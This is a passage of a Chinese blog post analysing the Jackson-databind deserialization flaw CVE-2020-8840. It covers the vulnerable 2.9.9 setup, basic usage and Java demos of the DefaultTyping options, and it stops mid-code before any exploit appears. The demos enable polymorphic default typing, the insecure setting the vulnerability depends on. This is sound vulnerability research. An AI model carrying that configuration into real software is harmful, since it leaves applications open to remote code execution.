<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>Jackson-databind 反序列化漏洞分析 (CVE-2020-8840) | Patrilic's blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/3.4.0/jquery.min.js"></script><link rel="icon" mask sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">Jackson-databind 反序列化漏洞分析 (CVE-2020-8840)</h1><a id="logo" href="/.">Patrilic's blog</a><p class="description">不忘初心</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/2019/04/01/Hello/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">Jackson-databind 反序列化漏洞分析 (CVE-2020-8840)</h1><div class="post-meta">Mar 24, 2020<span> | </span><span class="category"><a href="/categories/Java-Sec/">Java_Sec</a></span><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> 阅读</span></span></div><a class="disqus-comment-count" data-disqus-identifier="2020/03/24/Jackson-databind 反序列化漏洞分析 (CVE-2020-8840)/" href="/2020/03/24/Jackson-databind 反序列化漏洞分析 (CVE-2020-8840)/#disqus_thread"></a><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">文章目录</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Build"><span class="toc-number">2.</span> <span class="toc-text">0x01 Build</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Jackson的基本用法"><span class="toc-number">3.</span> <span class="toc-text">0x02 Jackson的基本用法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#序列化"><span class="toc-number">3.1.</span> <span class="toc-text">序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#反序列化"><span class="toc-number">3.2.</span> <span class="toc-text">反序列化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-PolymorphicDeserialization"><span class="toc-number">4.</span> <span class="toc-text">0x03 PolymorphicDeserialization</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DefaultTyping"><span class="toc-number">4.1.</span> <span class="toc-text">DefaultTyping</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#JAVA-LANG-OBJECT"><span class="toc-number">4.1.1.</span> <span class="toc-text">JAVA_LANG_OBJECT</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#OBJECT-AND-NON-CONCRETE"><span class="toc-number">4.1.2.</span> <span class="toc-text">OBJECT_AND_NON_CONCRETE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NON-CONCRETE-AND-ARRAYS"><span class="toc-number">4.1.3.</span> <span class="toc-text">NON_CONCRETE_AND_ARRAYS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NON-FINAL"><span class="toc-number">4.1.4.</span> <span class="toc-text">NON_FINAL</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Per-class-annotations"><span class="toc-number">4.2.</span> <span class="toc-text">Per-class annotations</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-Jackson解析流程"><span class="toc-number">5.</span> <span class="toc-text">0x04 Jackson解析流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-反序列化利用"><span class="toc-number">6.</span> <span class="toc-text">0x05 反序列化利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2020-8840"><span class="toc-number">6.1.</span> <span class="toc-text">CVE-2020-8840</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-相关链接"><span class="toc-number">7.</span> <span class="toc-text">0x06 相关链接</span></a></li></ol></div></div><div class="post-content"><blockquote>
<p>@Author: Patrilic<br>@Time: 2020-3-24 20:13:43</p>
</blockquote>
<p><img src="/wallpaper/silhouette2.jpg" alt></p>
<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Jackson是一款当下流行的json解释器，主要负责处理Json的序列化和反序列化。<br>jackson核心模块由三部分构成：</p>
<ul>
<li>jackson-core  - 核心包，提供基于流模式API</li>
<li>jackson-annotations - 注解包，提供标准注解功能</li>
<li>jackson-databind - 数据绑定包， 提供基于”对象绑定” 解析的相关 API （ ObjectMapper ） 和”树模型” 解析的相关 API</li>
</ul>
<p>这里我们先Build一个2.9.9版本的jackson-databind, 因为jackson-databind依赖于core和annotations，所以这两个包也会自动下载。</p>
<h2 id="0x01-Build"><a href="#0x01-Build" class="headerlink" title="0x01 Build"></a>0x01 Build</h2><p>JDK Version : 7u80</p>
<p>pom.xml:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-databind --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.xbean/xbean-reflect --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.xbean<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xbean-reflect<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.16<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/Jackson-databind 反序列化漏洞分析/A206E45D-7C6D-4D35-B265-88F6D707755B.png" alt="d3ceeb3eacfb24ce43320ac07025f620"></p>
<h2 id="0x02-Jackson的基本用法"><a href="#0x02-Jackson的基本用法" class="headerlink" title="0x02 Jackson的基本用法"></a>0x02 Jackson的基本用法</h2><p>Jackson的主要职责就是序列化和反序列化</p>
<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.jackson;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">serialize</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Student a = <span class="keyword">new</span> Student();</span><br><span class="line">        a.setName(<span class="string">"Patrilic"</span>);</span><br><span class="line">        a.setAge(<span class="number">20</span>);</span><br><span class="line">        a.setSex(<span class="string">"male"</span>);</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String json = mapper.writeValueAsString(a);</span><br><span class="line">            System.out.println(<span class="string">"序列化前: "</span> + a);</span><br><span class="line">            System.out.println(<span class="string">"序列化后: "</span> + json);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/Jackson-databind 反序列化漏洞分析/83258352-CB63-48A5-BF0D-3293C40DD0A9.png" alt="25c2c6ea07cc16608acb2eafaef321c7"></p>
<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.jackson;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">unserialize</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String json = <span class="string">"&#123;\"name\":\"Patrilic\",\"age\":20,\"sex\":\"male\"&#125;"</span>;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"反序列化后: "</span> + mapper.readValue(json, Student.class));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/Jackson-databind 反序列化漏洞分析/CAD049CC-AE43-4963-9A2B-DEFBDA1418F9.png" alt="44c694c184b5e18a293d96d40f00e9d2"></p>
<h2 id="0x03-PolymorphicDeserialization"><a href="#0x03-PolymorphicDeserialization" class="headerlink" title="0x03 PolymorphicDeserialization"></a>0x03 PolymorphicDeserialization</h2><p><a href="https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization" target="_blank" rel="noopener">https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization</a></p>
<p>在Jaskson的Wiki中可以看到，Jaskson有一种特殊的机制，叫做<code>JacksonPolymorphicDeserialization</code><br>（Jackson的多态反序列化?）</p>
<p>在wiki中分为两类:</p>
<ul>
<li>Global default typing</li>
<li>Per-class annotations</li>
</ul>
<h3 id="DefaultTyping"><a href="#DefaultTyping" class="headerlink" title="DefaultTyping"></a>DefaultTyping</h3><p>我们唯一可以配置的值就是选择哪些类可以被影响</p>
<p>在<code>com/fasterxml/jackson/databind/ObjectMapper.class:1824行</code>配置了四个选项<br><img src="/Jackson-databind 反序列化漏洞分析/80AF79FF-5F57-4D74-88B7-BA7E41F495BA.png" alt="d97869cc25fa24f4eb7700a79d134b5e"></p>
<ul>
<li><p>JAVA_LANG_OBJECT：仅影响Object.class类型的属性</p>
</li>
<li><p>OBJECT_AND_NON_CONCRETE：影响Object.class和所有非具体类型（抽象类，接口）</p>
</li>
<li><p>NON_CONCRETE_AND_ARRAYS：与上面相同，并且所有数组类型都相同（直接元素是非具体类型或Object.class）</p>
</li>
<li><p>NON_FINAL：影响所有未声明为 “final”的类型，以及非final元素类型的数组类型。</p>
</li>
</ul>
<p>接下来细细来试试这几个配置的具体细节</p>
<h4 id="JAVA-LANG-OBJECT"><a href="#JAVA-LANG-OBJECT" class="headerlink" title="JAVA_LANG_OBJECT"></a>JAVA_LANG_OBJECT</h4><p>当类里的属性声明为一个Object时，会对该属性进行序列化和反序列化，并且明确规定类名。（当然，这个Object本身也得是一个可被序列化/反序列化的类）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaLangObject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        People Q = <span class="keyword">new</span> People();</span><br><span class="line">        Q.age = <span class="number">20</span>;</span><br><span class="line">        Q.name = <span class="string">"com.patrilic.jackson.patrilic"</span>;</span><br><span class="line">        Q.object = <span class="keyword">new</span> patrilic();</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);</span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        String json = mapper.writeValueAsString(Q);</span><br><span class="line">        System.out.print(json); <span class="comment">// &#123;"age":20,"name":"com.patrilic.jackson.patrilic","object":["com.patrilic.jackson.patrilic",&#123;"length":100&#125;]&#125;</span></span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"\n"</span>);</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        People Q2 = mapper.readValue(json, People.class);</span><br><span class="line">        System.out.println(Q2); <span class="comment">// age = 20, name = com.patrilic.jackson.patrilic, object = com.patrilic.jackson.patrilic@75215398</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"age = %d, name = %s, object = %s"</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">"null"</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">patrilic</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/Jackson-databind 反序列化漏洞分析/234ECA79-4B9F-4B60-9AF6-8C9934812152.png" alt="791124ea4f2d09f6f73bd2fcdd5bc8e8"></p>
<p>类也会同时进行序列化和反序列化</p>
<h4 id="OBJECT-AND-NON-CONCRETE"><a href="#OBJECT-AND-NON-CONCRETE" class="headerlink" title="OBJECT_AND_NON_CONCRETE"></a>OBJECT_AND_NON_CONCRETE</h4><p>除了普通的Object， 当类里有 Interface 、 AbstractClass 时，对其进行序列化和反序列化。（当然，这些类本身需要是合法的、可以被序列化/反序列化的对象）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaLangObject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        People Q = <span class="keyword">new</span> People();</span><br><span class="line">        Q.age = <span class="number">20</span>;</span><br><span class="line">        Q.name = <span class="string">"com.patrilic.jackson.patrilic"</span>;</span><br><span class="line">        Q.object = <span class="keyword">new</span> patrilic();</span><br><span class="line">        Q.sex = <span class="keyword">new</span> MySex();</span><br><span class="line">        Q.sex.setSex(<span class="string">"male"</span>);</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);</span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        String json = mapper.writeValueAsString(Q);</span><br><span class="line">        System.out.print(json);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"\n"</span>);</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        People Q2 = mapper.readValue(json, People.class);</span><br><span class="line">        System.out.println(Q2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"age = %d, name = %s, object = %s, sex = %s"</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">"null"</span> : object, sex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">patrilic</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySex</span> <span class="keyword">implements</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    String sex;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(String sex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(String sex)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getSex</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/Jackson-databind 反序列化漏洞分析/96681004-E6B2-4A54-BAD6-4ED5C61CC40A.png" alt="aafd7ffbd71332a8bf0873da529ec6a1"></p>
<p>如果我们这里不设置<code>OBJECT_AND_NON_CONCRETE</code>，那么将会不能进行反序列化<br><img src="/Jackson-databind 反序列化漏洞分析/5F29E711-E153-41A3-86E7-E7E12533E1DD.png" alt="e13a47ca858995f890c54a3e71d47efe"></p>
<p>默认无参<code>enableDefaultTyping()</code>即为OBJECT_AND_NON_CONCRETE选项</p>
<h4 id="NON-CONCRETE-AND-ARRAYS"><a href="#NON-CONCRETE-AND-ARRAYS" class="headerlink" title="NON_CONCRETE_AND_ARRAYS"></a>NON_CONCRETE_AND_ARRAYS</h4><p>意思很明显，在OBJECT_AND_NON_CONCRETE选项之上，再加一个<code>Arrays</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaLangObject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        People Q = <span class="keyword">new</span> People();</span><br><span class="line">        Q.age = <span class="number">20</span>;</span><br><span class="line">        Q.name = <span class="string">"com.patrilic.jackson.patrilic"</span>;</span><br><span class="line">        patrilic[] patrilic = <span class="keyword">new</span> patrilic[<span class="number">2</span>];</span><br><span class="line">        patrilic[<span class="number">0</span>] = <span class="keyword">new</span> patrilic();</span><br><span class="line">        patrilic[<span class="number">0</span>].length = <span class="number">1</span>;</span><br><span class="line">        patrilic[<span class="number">1</span>] = <span class="keyword">new</span> patrilic();</span><br><span class="line">        Q.object = patrilic;</span><br><span class="line">        Q.sex = <span class="keyword">new</span> MySex();</span><br><span class="line">        Q.sex.setSex(<span class="string">"male"</span>);</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_CONCRETE_AND_ARRAYS);</span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        String json = mapper.writeValueAsString(Q);</span><br><span class="line">        System.out.print(json);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"\n"</span>);</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        People Q2 = mapper.readValue(json, People.class);</span><br><span class="line">        System.out.println(Q2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    